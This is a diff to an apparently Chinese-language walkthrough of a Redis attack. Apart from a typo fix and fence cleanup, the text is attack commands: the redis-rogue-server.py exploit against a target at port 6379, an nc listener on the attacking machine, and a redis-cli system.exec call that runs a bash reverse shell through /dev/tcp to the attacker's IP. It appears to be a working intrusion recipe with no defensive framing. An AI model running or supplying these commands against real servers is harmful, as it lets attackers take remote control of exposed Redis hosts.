@@ -101,25 +101,21 @@ python3 redis-rogue-server.py --rhost 目标机IP --rport 目标机端口 --lhos
 python3 redis-rogue-server.py --rhost 10.165.15.225 --rport 6379 --lhost 10.165.15.22 --lport 21000
 ```
 
-开始反弹skell
+开始反弹shell
 
 
 1、攻击机第一个终端监听
 
-···bash
-
+···
 nc -lvnp 4444
-
 ···
 
 
 2、攻击机第二个终端输入
 
-···bash
-
+···
 redis-cli -h 10.165.15.225 -p 6379
 system.exec "bash -c 'bash -i >& /dev/tcp/10.165.15.22/4444 0>&1'"
-
 ```
 
 
